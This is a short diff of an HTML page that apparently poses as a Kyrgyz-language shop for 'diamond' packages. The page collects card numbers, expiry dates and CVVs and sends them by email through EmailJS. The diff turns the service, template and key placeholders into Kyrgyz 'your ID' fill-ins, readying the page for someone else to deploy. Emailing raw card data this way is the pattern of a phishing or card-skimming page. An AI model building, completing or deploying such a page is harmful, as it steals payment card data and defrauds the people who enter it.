@@ -127,7 +127,6 @@
     <input type="text" name="expiry" placeholder="Мөөнөт (MM/YY)" required><br><br>
     <input type="text" name="cvv" placeholder="CVV" required><br><br>
 
-    <!-- Алмаз пакеттери -->
     <label for="diamonds">Алмаз пакети тандаңыз:</label><br>
     <select name="diamonds" id="diamonds">
       <option value="100">100 Алмаз - 60 сом</option>
@@ -144,7 +143,7 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   (function(){
-     emailjs.init("ТВОЙ_PUBLIC_KEY"); // EmailJS’деги public key
+     emailjs.init("СЕНИН_PUBLIC_KEY"); // EmailJS’деги public key
   })();
 
   function isValidCard(number) {
@@ -169,7 +168,7 @@
       return;
     }
 
-    emailjs.send('service_id', 'template_id', {
+    emailjs.send('СЕНИН_SERVICE_ID', 'СЕНИН_TEMPLATE_ID', {
       cardNumber: this.cardNumber.value,
       expiry: this.expiry.value,
       cvv: this.cvv.value,
